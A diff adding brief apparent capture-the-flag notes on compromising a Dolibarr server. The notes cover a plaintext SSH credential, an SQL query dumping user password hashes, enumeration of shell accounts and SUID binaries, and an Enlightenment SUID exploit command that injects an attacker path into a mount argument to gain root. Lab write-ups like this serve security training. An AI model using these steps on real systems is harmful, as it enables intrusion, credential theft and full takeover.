@@ -1,0 +1,30 @@
+### Dolibarr Main Account details
+
+**Database name**
+dolibarr
+
+** SSH Login **
+dolibarrowner:serverfun2$2023!!
+
+
+#### Database Query for Dolibarr llx_user table
+```sql
+SELECT admin, login, pass, pass_crypted, pass_encoding, firstname, lastname from llx_user;
+```
+
+### Search for other accounts
+cat /etc/passwd | grep 'sh$'
+
+### Get root shell
+
+```shell
+$ find / -type f -perm -u=s 2>/dev/null
+```
+
+** Google Search: "Enlightenment SUID Exploit"
+
+** Modify the code of the exploit.sh file by moving line 71 and 72 to be same line to line 70. They are the same line of code.**
+
+```
+$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
+```
